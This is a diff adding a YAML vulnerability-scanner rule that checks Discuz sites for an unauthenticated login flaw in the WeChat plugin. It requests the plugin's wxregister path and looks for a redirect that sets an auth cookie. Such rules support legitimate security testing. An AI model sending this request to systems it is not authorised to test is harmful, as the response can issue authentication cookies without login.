@@ -1,0 +1,11 @@
+name: poc-yaml-discuz-wechat-plugins-unauth
+rules:
+  - method: GET
+    path: '/plugin.php?id=wechat:wechat&ac=wxregister'
+    follow_redirects: false
+    expression: |
+      response.status == 302 && "set-cookie" in response.headers && response.headers["set-cookie"].contains("auth") && "location" in response.headers && response.headers["location"].contains("wsq.discuz.com")
+detail:
+  author: JrD
+  links:
+    - https://gitee.com/ComsenzDiscuz/DiscuzX/issues/IPRUI
